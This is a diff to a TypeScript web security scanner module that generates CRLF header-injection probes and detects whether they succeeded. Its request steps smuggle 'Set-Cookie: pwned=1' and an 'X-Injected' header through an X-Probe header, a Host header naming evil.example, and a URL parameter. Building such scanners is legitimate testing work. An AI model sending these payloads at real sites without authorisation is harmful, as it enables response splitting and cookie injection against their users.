@@ -9,9 +9,10 @@
 import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
 import { claimFor } from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
+import { getPayloadStore } from '../payloads/store'
 
-const CRLF = '\r\n'
-const INJECTED_COOKIE = 'pwned=1'
+const CRLF = () => (getPayloadStore().getPayloads('header-injection/crlf', 'crlf'))[0] ?? '\r\n'
+const INJECTED_COOKIE = () => (getPayloadStore().getPayloads('header-injection/crlf', 'cookie_inject'))[0] ?? 'pwned=1'
 
 export const headerInjection: TechniquePrimitive = {
   id: 'headerInjection',
@@ -26,26 +27,28 @@ export const headerInjection: TechniquePrimitive = {
     const method = ctx.endpoint?.method ?? 'GET'
     const baseHeaders = { ...(ctx.sessionHeaders ?? {}) }
     const param = ctx.param ?? ctx.endpoint?.params?.[0]?.name
+    const crlf = CRLF()
+    const injectedCookie = INJECTED_COOKIE()
     const steps: AttackStep[] = []
 
     steps.push({
       id: 'crlf-header',
       description: 'CRLF injection via X-Probe header',
-      request: { method, url, headers: { ...baseHeaders, 'X-Probe': `x${CRLF}Set-Cookie: ${INJECTED_COOKIE}` } },
+      request: { method, url, headers: { ...baseHeaders, 'X-Probe': `x${crlf}Set-Cookie: ${injectedCookie}` } },
       expectedSignal: 'response contains injected Set-Cookie',
       metadata: { kind: 'crlf', label: 'header' },
     })
     steps.push({
       id: 'crlf-host',
       description: 'CRLF injection via Host header',
-      request: { method, url, headers: { ...baseHeaders, Host: `evil.example${CRLF}X-Injected: 1` } },
+      request: { method, url, headers: { ...baseHeaders, Host: `evil.example${crlf}X-Injected: 1` } },
       expectedSignal: 'response reflects injected header',
       metadata: { kind: 'crlf', label: 'host' },
     })
     if (param) {
       try {
         const u = new URL(url)
-        u.searchParams.set(param, `x${CRLF}Set-Cookie: ${INJECTED_COOKIE}`)
+        u.searchParams.set(param, `x${crlf}Set-Cookie: ${injectedCookie}`)
         steps.push({
           id: 'crlf-param',
           description: `CRLF injection via param ${param}`,
@@ -62,13 +65,14 @@ export const headerInjection: TechniquePrimitive = {
   async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
     const evidence: PrimitiveResult['evidence'] = []
     let hit = false
+    const injectedCookie = INJECTED_COOKIE()
     for (const r of results) {
       const headers = r.headers ?? {}
       const cookie = headers['set-cookie'] ?? headers['Set-Cookie']
       const location = headers['location'] ?? headers['Location']
       const injected =
-        (typeof cookie === 'string' && cookie.includes(INJECTED_COOKIE)) ||
-        (Array.isArray(cookie) && cookie.some((c) => String(c).includes(INJECTED_COOKIE))) ||
+        (typeof cookie === 'string' && cookie.includes(injectedCookie)) ||
+        (Array.isArray(cookie) && cookie.some((c) => String(c).includes(injectedCookie))) ||
         (typeof location === 'string' && location.includes('evil.example'))
       if (injected) {
         hit = true
